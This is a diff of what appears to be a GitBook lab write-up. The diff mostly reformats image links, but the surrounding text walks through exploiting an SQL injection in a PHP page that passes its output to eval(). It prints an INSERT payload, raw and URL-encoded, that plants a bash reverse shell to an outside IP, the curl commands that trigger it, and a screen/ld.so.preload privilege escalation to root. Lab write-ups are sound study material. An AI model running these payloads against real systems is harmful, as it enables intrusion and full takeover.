@@ -70,7 +70,7 @@ The other files weren't so interesting.
 
 Port 80 reveals a standard login:
 
-<figure><img src="../../../.gitbook/assets/image (3196).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3196).png>)
 
 We can view the found found earlier to find PHP source code:
 
@@ -119,15 +119,15 @@ mysqli_close($conn);
 
 We can see that there's an SQL Injection within the `get_page` function. The `redirect_url` is taken as the `$route_string` variable. If we attempt basic injection, it redirects us to `phpinfo.php`:
 
-<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(117).png>)
 
 Within this, we can see that there are no disabled functions, and that the document root is at `/var/www/html`:
 
-<figure><img src="../../../.gitbook/assets/image (3712).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3712).png>)
 
 I attempted to write some files, but it fails:
 
-<figure><img src="../../../.gitbook/assets/image (3707).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3707).png>)
 
 So writing webshells won't work. When I looked at the code again, I saw that it was using `eval()` after the `get_page` function returns. This means that if we can somehow make the function return PHP code, it would be executed in `eval()`.
 
@@ -137,28 +137,24 @@ We know that the database is called `webpages`, and that there are 2 columns in 
 
 I tried creating a new directory with one PHP payload on it:
 
-{% code overflow="wrap" %}
 ```sql
 ";INSERT INTO webpages(route_string, page_data) VALUES ('/rev', 'echo shell_exec("bash -i >& /dev/tcp/192.168.45.227/80 0>&1");'); --
 
 ## after URL encoding
 %22%3BINSERT%20INTO%20webpages%28route_string%2C%20page_data%29%20VALUES%20%28%27%2Frev%27%2C%20%27echo%20shell_exec%28%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.227%2F80%200%3E%261%22%29%3B%27%29%3B%20--
 ```
-{% endcode %}
 
 Then visit `index.php` with that payload and visit `/rev`.
 
-{% code overflow="wrap" %}
 ```bash
 $ curl http://192.168.157.162/%22%3BINSERT%20INTO%20webpages%28route_string%2C%20page_data%29%20VALUES%20%28%27%2Frev%27%2C%20%27echo%20shell_exec%28%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.227%2F80%200%3E%261%22%29%3B%27%29%3B%20--
 
 $ curl http://192.168.157.162/rev
 ```
-{% endcode %}
 
 We would then get a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (2860).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2860).png>)
 
 ## Privilege Escalation
 
@@ -172,7 +168,7 @@ Ctrl + Z
 stty raw -echo;fg
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3732).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3732).png>)
 
 ### Screen Capabilities -> Root
 
@@ -256,6 +252,6 @@ screen -D -m -L ld.so.preload echo -ne  "\x0a/var/lib/php/session/libhax.so"
 /var/lib/php/session/rootshell
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3186).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3186).png>)
 
 Rooted!
